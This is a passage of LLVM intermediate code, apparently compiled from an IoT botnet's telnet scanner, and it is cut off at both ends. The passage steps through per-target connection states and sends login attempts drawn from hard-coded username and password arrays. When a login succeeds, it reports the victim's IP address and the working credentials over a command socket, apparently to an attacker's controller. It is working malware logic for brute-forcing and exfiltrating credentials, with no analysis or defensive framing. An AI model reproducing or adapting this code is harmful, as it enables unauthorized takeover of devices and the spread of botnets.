  br i1 %772, label %773, label %793

773:                                              ; preds = %757
  %774 = load i32, i32* %2, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 8
  %778 = load i8*, i8** %777, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %778, i8 0, i64 1024, i1 false)
  %779 = load i32, i32* %2, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 0
  %783 = load i32, i32* %782, align 16
  %784 = call i32 @sclose(i32 %783)
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 2
  store i8 0, i8* %788, align 8
  %789 = load i32, i32* %2, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 3
  store i8 0, i8* %792, align 1
  br label %1285

793:                                              ; preds = %757
  %794 = load i32, i32* %2, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 8
  %798 = load i8*, i8** %797, align 8
  %799 = call i32 @matchPrompt(i8* %798)
  %800 = icmp ne i32 %799, 0
  br i1 %800, label %821, label %801

801:                                              ; preds = %793
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 8
  %806 = load i8*, i8** %805, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %806, i8 0, i64 1024, i1 false)
  %807 = load i32, i32* %2, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 16
  %812 = call i32 @sclose(i32 %811)
  %813 = load i32, i32* %2, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 2
  store i8 0, i8* %816, align 8
  %817 = load i32, i32* %2, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 3
  store i8 1, i8* %820, align 1
  br label %1285

821:                                              ; preds = %793
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 2
  store i8 7, i8* %825, align 8
  br label %826

826:                                              ; preds = %821
  %827 = load i32, i32* %2, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 8
  %831 = load i8*, i8** %830, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %831, i8 0, i64 1024, i1 false)
  br label %1285

832:                                              ; preds = %738
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 8
  %837 = load i8*, i8** %836, align 8
  %838 = call i64 @strlen(i8* %837) #11
  %839 = trunc i64 %838 to i16
  %840 = load i32, i32* %2, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 7
  store i16 %839, i16* %843, align 16
  br label %844

844:                                              ; preds = %832
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 6
  %849 = load i32, i32* %848, align 4
  %850 = add i32 %849, 30
  %851 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %852 = icmp ult i32 %850, %851
  br i1 %852, label %853, label %868

853:                                              ; preds = %844
  %854 = load i32, i32* %2, align 4
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 0
  %858 = load i32, i32* %857, align 16
  %859 = call i32 @sclose(i32 %858)
  %860 = load i32, i32* %2, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 2
  store i8 0, i8* %863, align 8
  %864 = load i32, i32* %2, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %865
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %866, i32 0, i32 3
  store i8 1, i8* %867, align 1
  br label %868

868:                                              ; preds = %853, %844
  br label %1284

869:                                              ; preds = %66
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 0
  %874 = load i32, i32* %873, align 16
  %875 = call i64 @send(i32 %874, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i64 4, i32 16384)
  %876 = icmp slt i64 %875, 0
  br i1 %876, label %877, label %892

877:                                              ; preds = %869
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 0
  %882 = load i32, i32* %881, align 16
  %883 = call i32 @sclose(i32 %882)
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 2
  store i8 0, i8* %887, align 8
  %888 = load i32, i32* %2, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %889
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %890, i32 0, i32 3
  store i8 1, i8* %891, align 1
  br label %1285

892:                                              ; preds = %869
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 2
  store i8 8, i8* %896, align 8
  br label %1284

897:                                              ; preds = %66
  %898 = load i32, i32* %2, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 0
  %902 = load i32, i32* %901, align 16
  %903 = call i64 @send(i32 %902, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i64 0, i64 0), i64 85, i32 16384)
  %904 = icmp slt i64 %903, 0
  br i1 %904, label %905, label %920

905:                                              ; preds = %897
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 0
  %910 = load i32, i32* %909, align 16
  %911 = call i32 @sclose(i32 %910)
  %912 = load i32, i32* %2, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %913
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %914, i32 0, i32 2
  store i8 0, i8* %915, align 8
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 3
  store i8 1, i8* %919, align 1
  br label %1285

920:                                              ; preds = %897
  %921 = load i32, i32* %2, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 2
  store i8 9, i8* %924, align 8
  br label %1284

925:                                              ; preds = %66
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 0
  %930 = load i32, i32* %929, align 16
  %931 = call i64 @send(i32 %930, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i64 0, i64 0), i64 49, i32 16384)
  %932 = icmp slt i64 %931, 0
  br i1 %932, label %933, label %948

933:                                              ; preds = %925
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 0
  %938 = load i32, i32* %937, align 16
  %939 = call i32 @sclose(i32 %938)
  %940 = load i32, i32* %2, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 2
  store i8 0, i8* %943, align 8
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 3
  store i8 1, i8* %947, align 1
  br label %1285

948:                                              ; preds = %925
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 2
  store i8 10, i8* %952, align 8
  br label %1284

953:                                              ; preds = %66
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 6
  %958 = load i32, i32* %957, align 4
  %959 = icmp eq i32 %958, 0
  br i1 %959, label %960, label %966

960:                                              ; preds = %953
  %961 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %962 = load i32, i32* %2, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 6
  store i32 %961, i32* %965, align 4
  br label %966

966:                                              ; preds = %960, %953
  %967 = load i32, i32* %2, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 0
  %971 = load i32, i32* %970, align 16
  %972 = load i32, i32* %2, align 4
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %973
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %974, i32 0, i32 8
  %976 = load i8*, i8** %975, align 8
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 7
  %981 = load i16, i16* %980, align 16
  %982 = zext i16 %981 to i32
  %983 = call i32 @readUntil(i32 %971, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %976, i32 1024, i32 %982)
  %984 = icmp ne i32 %983, 0
  br i1 %984, label %985, label %1048

985:                                              ; preds = %966
  %986 = load i32, i32* %2, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 6
  store i32 0, i32* %989, align 4
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 7
  store i16 0, i16* %993, align 16
  %994 = load i32, i32* %2, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 8
  %998 = load i8*, i8** %997, align 8
  %999 = call i8* @strstr(i8* %998, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i64 0, i64 0)) #11
  %1000 = icmp ne i8* %999, null
  br i1 %1000, label %1001, label %1028

1001:                                             ; preds = %985
  %1002 = load i32, i32* @mainCommSock, align 4
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1005, i32 0, i32 1
  %1007 = bitcast i32* %1006 to %struct.in_addr*
  %1008 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1007, i32 0, i32 0
  %1009 = load i32, i32* %1008, align 4
  %1010 = call i8* @inet_ntoa(i32 %1009) #12
  %1011 = load i32, i32* %2, align 4
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 4
  %1015 = load i8, i8* %1014, align 2
  %1016 = zext i8 %1015 to i64
  %1017 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1016
  %1018 = load i8*, i8** %1017, align 8
  %1019 = load i32, i32* %2, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1020
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1021, i32 0, i32 5
  %1023 = load i8, i8* %1022, align 1
  %1024 = zext i8 %1023 to i64
  %1025 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1024
  %1026 = load i8*, i8** %1025, align 8
  %1027 = call i32 (i32, i8*, ...) @sockprintf(i32 %1002, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.35, i64 0, i64 0), i8* %1010, i8* %1018, i8* %1026)
  br label %1028

1028:                                             ; preds = %1001, %985
  %1029 = load i32, i32* %2, align 4
  %1030 = sext i32 %1029 to i64
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1030
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1031, i32 0, i32 8
  %1033 = load i8*, i8** %1032, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1033, i8 0, i64 1024, i1 false)
  %1034 = load i32, i32* %2, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1035
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1036, i32 0, i32 0
  %1038 = load i32, i32* %1037, align 16
  %1039 = call i32 @sclose(i32 %1038)
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 3
  store i8 1, i8* %1043, align 1
  %1044 = load i32, i32* %2, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 2
  store i8 0, i8* %1047, align 8
  br label %1285

1048:                                             ; preds = %966
  %1049 = load i32, i32* %2, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 8
  %1053 = load i8*, i8** %1052, align 8
  %1054 = call i64 @strlen(i8* %1053) #11
  %1055 = trunc i64 %1054 to i16
  %1056 = load i32, i32* %2, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 7
  store i16 %1055, i16* %1059, align 16
  br label %1060

1060:                                             ; preds = %1048
  %1061 = load i32, i32* %2, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 6
  %1065 = load i32, i32* %1064, align 4
  %1066 = add i32 %1065, 30
  %1067 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1068 = icmp ult i32 %1066, %1067
  br i1 %1068, label %1069, label %1084

1069:                                             ; preds = %1060
  %1070 = load i32, i32* %2, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 0
  %1074 = load i32, i32* %1073, align 16
  %1075 = call i32 @sclose(i32 %1074)
  %1076 = load i32, i32* %2, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1077
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1078, i32 0, i32 2
  store i8 0, i8* %1079, align 8
  %1080 = load i32, i32* %2, align 4
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 3
  store i8 1, i8* %1083, align 1
  br label %1084

1084:                                             ; preds = %1069, %1060
  br label %1284

1085:                                             ; preds = %66
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 0
  %1090 = load i32, i32* %1089, align 16
  %1091 = call i64 @send(i32 %1090, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i64 4, i32 16384)
  %1092 = icmp slt i64 %1091, 0
  br i1 %1092, label %1093, label %1108

1093:                                             ; preds = %1085
  %1094 = load i32, i32* %2, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1095
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1096, i32 0, i32 0
  %1098 = load i32, i32* %1097, align 16
  %1099 = call i32 @sclose(i32 %1098)
  %1100 = load i32, i32* %2, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1102, i32 0, i32 2
  store i8 0, i8* %1103, align 8
  %1104 = load i32, i32* %2, align 4
  %1105 = sext i32 %1104 to i64
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1105
  %1107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1106, i32 0, i32 3
  store i8 1, i8* %1107, align 1
  br label %1285

1108:                                             ; preds = %1085
  %1109 = load i32, i32* %2, align 4
  %1110 = sext i32 %1109 to i64
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 2
  store i8 101, i8* %1112, align 8
  br label %1284

1113:                                             ; preds = %66
  %1114 = load i32, i32* %2, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 0
  %1118 = load i32, i32* %1117, align 16
  %1119 = call i64 @send(i32 %1118, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i64 0, i64 0), i64 282, i32 16384)
  %1120 = icmp slt i64 %1119, 0
  br i1 %1120, label %1121, label %1136

1121:                                             ; preds = %1113
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 16
  %1127 = call i32 @sclose(i32 %1126)
  %1128 = load i32, i32* %2, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1130, i32 0, i32 2
  store i8 0, i8* %1131, align 8
  %1132 = load i32, i32* %2, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1134, i32 0, i32 3
  store i8 1, i8* %1135, align 1
  br label %1285

1136:                                             ; preds = %1113
  %1137 = load i32, i32* %2, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 2
  store i8 102, i8* %1140, align 8
  br label %1284

1141:                                             ; preds = %66
  %1142 = load i32, i32* %2, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 0
  %1146 = load i32, i32* %1145, align 16
  %1147 = call i64 @send(i32 %1146, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i64 0, i64 0), i64 49, i32 16384)
  %1148 = icmp slt i64 %1147, 0
  br i1 %1148, label %1149, label %1164

1149:                                             ; preds = %1141
  %1150 = load i32, i32* %2, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1151
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1152, i32 0, i32 0
  %1154 = load i32, i32* %1153, align 16
  %1155 = call i32 @sclose(i32 %1154)
  %1156 = load i32, i32* %2, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 2
  store i8 0, i8* %1159, align 8
  %1160 = load i32, i32* %2, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1161
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1162, i32 0, i32 3
  store i8 1, i8* %1163, align 1
  br label %1285

1164:                                             ; preds = %1141
  %1165 = load i32, i32* %2, align 4
  %1166 = sext i32 %1165 to i64
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1166
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1167, i32 0, i32 2
  store i8 103, i8* %1168, align 8
  br label %1284

1169:                                             ; preds = %66
  %1170 = load i32, i32* %2, align 4
  %1171 = sext i32 %1170 to i64
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1171
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1172, i32 0, i32 6
  %1174 = load i32, i32* %1173, align 4
  %1175 = icmp eq i32 %1174, 0
  br i1 %1175, label %1176, label %1182

1176:                                             ; preds = %1169
  %1177 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1178 = load i32, i32* %2, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 6
  store i32 %1177, i32* %1181, align 4
  br label %1182

1182:                                             ; preds = %1176, %1169
  %1183 = load i32, i32* %2, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1184
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1185, i32 0, i32 0
  %1187 = load i32, i32* %1186, align 16
  %1188 = load i32, i32* %2, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 8
  %1192 = load i8*, i8** %1191, align 8
  %1193 = load i32, i32* %2, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 7
  %1197 = load i16, i16* %1196, align 16
  %1198 = zext i16 %1197 to i32
  %1199 = call i32 @readUntil(i32 %1187, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %1192, i32 1024, i32 %1198)
  %1200 = icmp ne i32 %1199, 0
  br i1 %1200, label %1201, label %1247

1201:                                             ; preds = %1182
  %1202 = load i32, i32* %2, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 6
  store i32 0, i32* %1205, align 4
  %1206 = load i32, i32* %2, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1207
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1208, i32 0, i32 7
  store i16 0, i16* %1209, align 16
  %1210 = load i32, i32* @mainCommSock, align 4
  %1211 = load i32, i32* %2, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 1
  %1215 = bitcast i32* %1214 to %struct.in_addr*
  %1216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1215, i32 0, i32 0
  %1217 = load i32, i32* %1216, align 4
  %1218 = call i8* @inet_ntoa(i32 %1217) #12
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 4
  %1223 = load i8, i8* %1222, align 2
  %1224 = zext i8 %1223 to i64
  %1225 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1224
  %1226 = load i8*, i8** %1225, align 8
  %1227 = call i32 (i32, i8*, ...) @sockprintf(i32 %1210, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i64 0, i64 0), i8* %1218, i8* %1226)
